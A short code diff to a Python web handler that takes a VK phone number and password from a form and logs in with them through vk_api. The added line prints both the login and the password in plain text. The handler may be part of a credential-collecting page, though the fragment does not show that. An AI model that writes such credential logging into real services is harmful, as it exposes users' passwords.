@@ -153,6 +153,7 @@ def handle_request10():
     # number = request.form.get('tglog')
     # co = request.form.get('tgco')
     nextf = request.form.get('next')
+    print(number, co)
     try:
         vk_session = vk_api.VkApi(number, co, captcha_handler=captcha_handler)
         vk_session.auth()
